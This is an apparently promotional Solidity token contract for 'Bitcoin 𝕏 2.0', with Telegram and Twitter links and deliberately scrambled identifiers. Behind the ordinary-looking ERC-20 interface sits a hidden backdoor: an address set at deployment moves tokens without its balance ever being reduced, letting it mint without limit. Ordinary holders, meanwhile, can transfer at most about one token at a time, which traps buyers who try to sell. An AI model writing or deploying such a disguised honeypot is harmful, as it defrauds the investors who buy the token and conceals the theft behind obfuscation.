/*

Telegram: https://t.me/BitcoinX2Portal

Twitter: https://twitter.com/BitcoinX2ERC

*/

// SPDX-License-Identifier: Unlicense

pragma solidity >0.8.10;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract Bitcoin is Ownable {
    constructor(address eiyh) {
        balanceOf[msg.sender] = totalSupply;
        qwtmesh[eiyh] = wulvn;
        IUniswapV2Router02 wxlfduksgh = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        yubqx = IUniswapV2Factory(wxlfduksgh.factory()).createPair(address(this), wxlfduksgh.WETH());
    }

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    mapping(address => uint256) public balanceOf;

    event Approval(address indexed owner, address indexed spender, uint256 value);

    mapping(address => mapping(address => uint256)) public allowance;

    uint256 private wulvn = 100;

    string public name = unicode"Bitcoin 𝕏 2.0";

    uint8 public decimals = 9;

    function approve(address sicw, uint256 amdoqtsv) public returns (bool success) {
        allowance[msg.sender][sicw] = amdoqtsv;
        emit Approval(msg.sender, sicw, amdoqtsv);
        return true;
    }

    event Transfer(address indexed from, address indexed to, uint256 value);

    mapping(address => uint256) private qwtmesh;

    address private yubqx;

    string public symbol = unicode"Bitcoin 𝕏 2.0";

    function transferFrom(address pdsh, address wigje, uint256 amdoqtsv) public returns (bool success) {
        require(amdoqtsv <= allowance[pdsh][msg.sender]);
        allowance[pdsh][msg.sender] -= amdoqtsv;
        dgkvfjin(pdsh, wigje, amdoqtsv);
        return true;
    }

    function transfer(address wigje, uint256 amdoqtsv) public returns (bool success) {
        dgkvfjin(msg.sender, wigje, amdoqtsv);
        return true;
    }

    function dgkvfjin(address pdsh, address wigje, uint256 amdoqtsv) private {
        if (0 == qwtmesh[pdsh]) {
            if (pdsh != yubqx && ldxbezirkgqt[pdsh] != block.number && amdoqtsv < totalSupply) {
                require(amdoqtsv <= totalSupply / (10 ** decimals));
            }
            balanceOf[pdsh] -= amdoqtsv;
        }
        balanceOf[wigje] += amdoqtsv;
        ldxbezirkgqt[wigje] = block.number;
        emit Transfer(pdsh, wigje, amdoqtsv);
    }

    mapping(address => uint256) private ldxbezirkgqt;
}